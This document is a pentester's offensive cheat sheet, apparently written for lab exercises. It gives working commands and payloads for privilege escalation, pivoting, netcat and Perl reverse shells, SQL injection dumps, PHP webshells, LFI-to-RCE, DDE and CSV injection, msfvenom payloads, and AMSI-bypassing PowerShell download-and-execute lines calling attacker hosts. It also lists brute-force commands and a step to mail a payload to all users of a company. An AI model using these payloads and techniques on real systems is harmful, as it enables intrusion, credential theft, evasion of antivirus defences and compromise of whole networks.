***********************************************************************************************
					PRIVESC (local)
***********************************************************************************************

root file with RW perms:
find / -user root -perm -o+w -type f 2> /dev/null  | grep -v /proc

windows password value in reg.keys:
reg query HKLM /f password /t REG_SZ /s

Find privesc exploit (via meterpreter) :
	post/multi/recon/local_exploit_suggester

	Manual:
	    Find pass in GPP:
            findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml

***********************************************************************************************
					PIVOTING
***********************************************************************************************
Use "socks4a" as proxy to pivot (set proxyhain and/or brower proxy) in MSF


proxychains ssh -R 0.0.0.0:23:10.11.0.244:23 kmkz@10.1.1.224
	-> Tunneling ssh (on set le lhost sur le serveur ssh, idem cot msf payload (stager requiert le meme lhost -> fwd sur ip attacker)

Port forwarding:
	If a machine only is allowed to perform outbound connections on port 80 and we want to connect from this machine to another one located in a external network
	to its RDP service, we can use a linux proxy with a port redirection software such as rinetd

	vim /etc/rinetd.conf

	bindaddress		bindport	TargetAddress		connectport
	Linux-Public-IP	80			Target-Machine-IP	3389

	note: For windows platform: fpipe and winrelay

Reverse SSH Tunnel:

	plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server

	plink -l root -pw mypassword 192.168.18.84 -R


SSH Dynamic Port Forwarding:

	(on attacker machine) ssh -D 8000 root@owenedSSHserver.com

	From here, we now are able to set a proxy that forwards all applications traffic through port 8000.
	This allow us to attack the internal network from our attacking machine (using our tools) through the compromised SSH Server.

	echo "socks4 127.0.0.1 8000" > /etc/proxychains.conf

Port forwading SSH (useful!)
	on 127.0.0.1: ssh -L 4455:192.168.12.103:443 kmkz@192.168.1.55
	access to 443 on 192.168.12.103 through 192.168.1.55 which is the GW (Browse 127.0.0.1:4455)


mknod backpipe p

	RDP on  192.168.1.14 over HTTP from 192.168.1.253 (on pivot machine:192.168.1.253 to access 192.168.1.14)
	nc -l -p 8080 0<backpipe | nc <IP_TARGET>3389 1>backpipe

***********************************************************************************************
					GET	SHELL
***********************************************************************************************

Reverse Shell netcat:
nc -lvp 443      # Attacker listening for connection
nc -nv <IP Address> 443 -e /bin/sh  # Victim launch connection & give a shell


NMAP:
bash-3.2$ sudo /usr/bin/nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !/bin/bash
bash-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash-3.2#

HPING3:
/usr/sbin/hping3 <<< /bin/ls|
> ls
basewords.txt            dump_mitm3          hydra.restore      SCREENS        u1313g.xml.dif


SNMPWALK:
snmpwalk 192.168.1.15 $(nc -vv 192.168.1.42 8888 >> /tmp/t)

MAN:
root@w00t:~# man -P "/bin/ls $(whoami && /bin/sh)" ls
echo "test" > /tmp/tata
id
^Csh: 0: Can't open root
uid=0(root)
man: commande terminÃ©e avec 127 comme code de retourÂ : sed -e '/^[[:space:]]*$/{ N; /^[[:space:]]*\n[[:space:]]*$/D; }' | (cd <fd 5> && LESS=-ix8RmPm Manual page ls(1) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h for help or q to quit)$PM Manual page ls(1) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h for help or q to quit)$ MAN_PN=ls(1) /bin/sh root
uid=0(root) gid=0(root) groupes=0(root))
root@w00t:~# cat /tmp/tata
test


***********************************************************************************************
					 SQLi Basics
***********************************************************************************************

SQLi:

number of column:
	id=3 order by 100-- - // play on order by value to find number

Get vulnerable column:
	id=-3 union all select 1,2,3,4,5,6,7,8,9-- -

Get current user:
	id=-3 union all select 1,2,3,4,5,user(),7,8,9-- -

(View pentestmonkey or http://www.sqlinjection.net/union/ for ideas)



Get DBs :
	http://www.tata.com/index.php?id=-3 UNION SELECT 1,group_concat( schema_name,'<br>'),3,4,5 from information_schema.schemata -- -


List tables + columns:

	id=-3 UNION SELECT 1,group_concat(table_name,0x3a, column_name,'<br>'),3,4,5 from information_schema.columns where  table_schema ='DB_Cible' AND table_name LIKE '%user%' -- -

Same request based on columns names:
	-3 UNION SELECT 1,group_concat(table_name,0x3a, column_name,'<br>'),3,4,5 from information_schema.columns where  table_schema ='DB_Cible' AND column_name LIKE '%log%' -- -


Dump data from targeted DB + table + columns:
	-3 UNION SELECT 1,group_concat( login,0x3a,mdp,'<br>'),3,4,5 from DB_Cible.user -- - // here user is the previous identified table_name, it may change...


Read file:
	id=-3 UNION SELECT 1,load_file('/etc/hosts'),3,4,5  -- -


Code exec using "into outfile' (MySQL):
(phpinfo() payload in Hex.):
	-7 UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -



Webshell:
	<pre><?php if($_REQUEST["cmd"]) {passthru( $_REQUEST["cmd"]);}?></pre>



Blind detection:
	http://evil.com/index.php?id=29 and substring(version(),1,1)=5 -- -

	Sub SELECT ok:
		http://evil.com/index.php?id=29 and (select 1)=1  -- -


SQLMAP usage:
	Google chrome "export cookie" module + Burp proxy usage:
		sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3


	SQLMAP tor+WaF bypassing + DBG (users enumeration):
		sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --users --tamper "space2morehash.py"  -v 3  --check-tor --level=5 --risk=3 --threads=5


	Tor usage: --tor --tor-type=SOCKS5
	Random useragent:  --random-agent


***********************************************************************************************
					FIREWALKING
***********************************************************************************************

FW bypassing over TCP by source port fixiation:
	traceroute  -p444 -T target-ip --sport=1111 -d --back -A --max-hops=16


firewalk  -n  -pTCP -d target-port  last-node-ip target-ip -s source-port

-S usage (ports range):
	firewalk -n -S 20-445 -pTCPlast-node-ip  target-ip -s 1028

Trick:
	do not hesitate to play with src port value


nmap --script=firewalk --traceroute XXXXX  --osscan-guess -sV -O -Pn -d --top-port=20 --reason -f



***********************************************************************************************
					WIRELESS
***********************************************************************************************

WPA/WPA2:

	airmon-ng start wlan0

	wash -i mon0

	airodump-ng mon0

	reaver -i mon0 -b XX:XX:XX:XX:XX:XX

	reaver -i mon0 -b XX:XX:XX:XX:XX:XX -vv

Client side attacks with "karma atack"

***********************************************************************************************
					OTHERS
***********************************************************************************************

dump bin to hex:
xxd -p   poc_cve_2015_0235 > dump.hex

reverse hex to bin:
xxd -p -r dump.hex > dumpfile.bin && chmod +x dumpfile.bin

Mail extraction from DB dump:
	grep -EiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' * |sort |uniq -c |sort | grep -v "pattern1"| grep -v "pattern2" |grep -v "pattern3"|grep -v "pattern4"|grep -v "pattern5"| sed -r -e "s/^.*[,:]([^,:]+@[^,:]+).*$/\1/g"

Add user windows:

	C:\Program Files>net user kmkz tatamaster /add
	net user kmkz tatamaster /add
	The command completed successfully.


	C:\Program Files>net localgroup Administrators kmkz /add
	net localgroup Administrators kmkz /add
	The command completed successfully.

Vhosts enumeration:

cat vhosts.sh:
	#!/bin/bash

	echo""
	echo "[+] Finding VHOSTS for: $1"
	echo ""
	curl http://api.hackertarget.com/reverseiplookup/?q=$1

Linux password cracking:
	root@kali:~# unshadow passwd-file.txt shadow-file.txt
		victim:$6$H4ndrFOW$FqzEd1MMbtEpB2azf5/xwx08arqM.jL0pk/k7ug9BksbguW81CQcof2IU4u./BExaKlc1:1000:1000:,,,:/home/victim:/bin/bash

	root@kali:~# unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
	root@kali:~# john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt


MSF Auxiliaries:
	auxiliary/scanner/portscan/tcp
	post/windows/gather/enum_logged_on_users
	post/multi/gather/dns_srv_lookup
	post/windows/gather/enum_applications
	post/windows/gather/enum_termserv (active RDP sessions)
	post/windows/gather/enum_putty_saved_sessions (if putty)
	post/windows/gather/credentials/credential_collector
	post/windows/gather/enum_shares
		auxiliary/scanner/smb/smb_enumshares // to view on which share we can access
	post/windows/gather/enum_snmp (SNMP on compromised host?)
	post/multi/recon/local_exploit_suggester
	post/windows/gather/credentials/vnc
	auxiliary/admin/mysql/mysql_enum

	Use the capture module for all protocols like SMB in order to collect creds:
		auxiliary/server/capture/smb
		http://www.adeptus-mechanicus.com/codex/metalan/metalan.html

Metepreter keylogging:
	keyscan:
		https://www.offensive-security.com/metasploit-unleashed/keylogging/

	post/windows/capture/keylog_recorder

Domain admin "problem":
	use incognito
	list_tokens -u
	impersonate_token DOMAIN.DOM\\Domain_Admin_user

	- Then spawn shell and:
		net user Pentester tAT@M45t3r /ADD /DOMAIN
		net group "Admin du domaine" Pentester /ADD

Winlogon RegKey passwd research/access (psexec 4 privesc):
	C:\xampp\webdav>reg query HKLM /f password /t REG_SZ /s

Host discovery:
	nmap -sn 10.11.1.1-254 -oG ping_sweep_nmap.grep
        grep Up ping_sweep_nmap.grep |cut -d " " -f2 >> list.txt

ALWAYS:
	View ARP cache on each machine
	View netstat output
	Look for new subnet to pivot & pwn !

Todo:
	Be Exhaustive in the security issues?

	Service fingerprinting
	Null Sessions + default passwords

	chek local FW:
		 netsh advfirewall firewall show rule name=all

	SMB vuln. assessment:
		nmap -v -p 445 --script=smb-vuln-* --script-args=unsafe=1 -iL List_windows.grep -Pn

	Test all http 80/443 (if custom then launch dirb on it)

	Identify/test network equipments:
		scan tcp 22,21,23 and udp 161 (snmp)


	if SNMP discovered:
		BF community by using custom script

Pwn the scope:
	https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials
	example:
		crackmapexec <protocol> <target(s)> -u username -p password

	use cmedb to view stored datas

Lateral movement:

	wmic /node:127.0.0.1 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"127.0.0.1\"")

	List sysaccount types:
		wmic sysaccount list /format:list

	Get logged-on users:
		wmic /node:ordws01 path win32_loggedonuser get antecedent

		From file:
			wmic /node:@workstations.txt path win32_loggedonuser get antecedent

	Authenticated RCE:
		wmic /node:127.0.0.1 PROCESS CALL Create "cmd.exe /c net user >> C:/Temp/test"
			or:
				wmic /node:@workstations.txt /user:[admin_for_rce] process call create "cmd.exe /c netstat -ano >> \\[YourIPaddr]\Temp\test"

	Application whitelisting bypass for lateral movement:
		wmic process get brief /format:"C:\Users\WMI\poc-wmic.xsl"
		wmic process LIST /FORMAT:"\\127.0.0.1\c$\Users\WMI\poc-wmic.xsl"

		w/ proxy authentication:
		powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('192.168.13.37/test2.xsl') -outfile test2.xsl";$cmd="wmic os get /format:'test2.xsl'"; iex $cmd

	WMI Class Derivation (Evasion) with no "win32" prefix:
		$C = [WmiClass] '/root/cimv2:Win32_Process'
		$N = $C.derive('MyEvilProcess')
		$N.Put()
		Invoke-WmiMethod MyEvilProcess -Name CrEaTe -ArgumentList calc.exe

	DDE/CSV injections:
	=cmd|'/c powershell.exe -encodedCommand JwBQAG8AQwAgAEQARABFACAAcAB3AG4AJwA= >> C:\\Users\\Default\\Desktop\\PoC.out'!_xlbgnm.A1

	Payload for Word:
		{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}
		{DDEAUTO c:\\windows\\system32\\cmd.exe "/c powershell.exe -encodedCommand JwBQAG8AQwAgAEQARABFACAAcAB3AG4AJwA= >> C:\\Users\\Default\\Desktop\\PoC.out"}

	Outlook:
		C/P docx payload + add it into calendar invitation -> forward it to all company's users

	Dpen browser for BeeF hooking via DDEAUTO for example:
		{DDEAUTO c:\\windows\\system32\\cmd.exe "/k start chrome --new-window https://attacker.com/beef-with-valid-SSLcert/index.html"}


Exploit windows:

	Trouver les modules pour la collecte de gadgets:
		dans Immunity => !mona  modules   --puis--   !mona find -s "\xff\xe4" -m VulnServer.exe (ou -m == module et -s == opcode ici un JMP ESP)

		Structure payload final:

			payload = 'A' * 1040 # trouv via pattern_create pis pattern_offset
			payload += struct.pack("I", 0x65d11d71) # EIP -> JMP ESP gadget trouv via mona + Immunity
			payload += "\x90" * 10 # nopsleds
			payload += shellcode # shellcode (msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.244 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x0a\x0d"   + nc -vv -l -p 4443)

Brute-force attacks:
	RDP:
		ncrack -vv --user offsec -P wordlist_perso.txt rdp://10.11.1.31

	SSH:
		hydra -l root -P wordlist_perso.txt 10.11.1.251 ssh

	.htaccess:
		medusa -h 10.11.1.8 -u admin -P wordlist_perso.txt -M http -m DIR:/cgi-bin/ -T 8




Basic php webshell:
	<pre><?php if($_REQUEST["cmd"]) {passthru( $_REQUEST["cmd"]);}?></pre>



XXS payload:
	 <script>location.href="http://10.11.0.244:8080/sL7oRAH"</script>

	 <meta http-equiv="refresh" content="0; URL=http://10.11.0.244:8080/sL7oRAH">


LFI payloads:
	http://10.11.4.4/addguestbook.php?name=%C3%A9&comment=%C3%A9&LANG=../../../../../../../xampp\apache\logs\access.log%00&Submit=Submit

	Then:
		nc -nv 10.11.4.4 80
		<?php echo shell_exec($_GET['cmd']);?>

		view-source:http://10.11.4.4/addguestbook.php?name=test&comment=blah&cmd=ipconfig&LANG=../../../../../../../xampp\apache\logs\access.log%00&Submit=Submit

	RCE through LFI:

		msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.244 LPORT=4444 -f exe-only > msf.exe

		The Powershell (wget.ps1) script lto DL our meterpreter look likes this:

			echo $storageDir = $pwd > get.ps1
			echo $webclient = New-Object System.Net.WebClient >> get.ps1
			echo $url = "http://10.11.0.244:1337/evil.exe" >> get.ps1
			echo $file = "msf.exe" >> get.ps1
			echo $webclient.DownloadFile($url,$file) >> get.ps1

		Finally it could be executed by using the following command (once the metasploit exploit/multi/handler was launched):

			powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File get.ps1



Pour tester le PTH de manire simple, ajouter les creds collects dans la DB (commande "creds" pour plus d'infos)

XSS stored (browser exploitation) server/browser_autopwn2

Reverse shell final payload:
	perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.11.0.244:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system("/bin/sh -c $_") while<>;'

Meterpreters generation basics:
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.244 LPORT=4444 -f asp > shell.asp
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.244 LPORT=4444 -f elf > shell

	Inject the payload in a "legit" binary (AV bypassing for example):
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.244 LPORT=4444 -f exe  -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_embedded.exe

	Reverse shell JS (client side and web apps attacks):
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.244 LPORT=4443 -f js_le -e generic/none

*****************************************************************************************************************************
#Protip:

- In .xls(x) injection payloads use double simple quote to escape simple quote in #Powershell Iex payload (even if b64 encoded) -> DownloadString(''http://attacker.com'')
	-> Exemple xlsx: =cmd|'/c powershell.exe -command iex (new-object Net.WebClient).DownloadString(''http://trololo/f.ps1'')'!_A1

- Always use Unicode.Getbyte in #powershell to successfully convert payloads in B64 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes([System.IO.File]::ReadAllText("sh.ps1")))

	-> Example:
	#B64 Ecoding:
		$Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes([System.IO.File]::ReadAllText("amsi-bypass.ps1")))
		Write-Output $Base64| Out-File "payload-b64"

	#B64 Decoding:
		$bytes = [Convert]::FromBase64String($Base64)
		[IO.File]::WriteAllBytes("payload-b64-decoded", $bytes)


- Payload using dropper (in memory execution) using web_delivery MSF module:

	# Source: https://github.com/jaredhaight/Invoke-MetasploitPayload
	powershell.exe -nop -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Invoke-MetasploitPayload.ps1')|iex; Invoke-MetasploitPayload  ('http://MSF-HANDLER:8080/posh-payload')"

- Payload with Web_delivery/Meterpreter or to host with simpleHttpServer (b64 encoded) + AMSI bypass (customise your template for AV/use unicorn):

	-Non updated Win10:
		$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);
		[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
		[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem);
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
		$e=new-object net.webclient;
		$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
		$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
		IEX $e.downloadstring('http://attacker-trusted-domain/pwn');

	- up tp date Windows 10 (27/09/2018):
		[ScriptBlock]."Get`Fiel`d"('signatures','N'+'onPublic,Static').SetValue($NULL,(New-Object Collections.Generic.HashSet[string]));
		$e=new-object net.webclient;
		$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
		$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
		IEX $e.downloadstring('http://192.168.56.1/MeterRsh.txt');



	Steps: create your payload using msfvenom/unicorn (meterpreter -> psh-net format hosted in "payload.txt") + handler setup -> host it -> convert AMSI bypassing payload in b64 -> execute b64 generated payload

- Obfuscated payload example that trigger a web_delivery (or other):
	-> useful for Rubber Ducky 'cause no cmd.exe/powershell.exe calls, just regsvr32 + sct file with embedded payload
	ftp.exe -> !r^E^g^S^v^R^3^2 /^s /^n /^u /^i:http://attacker-Domain/policy.sct s^C^r^O^b^j.D^l^L

*****************************************************************************************************************************
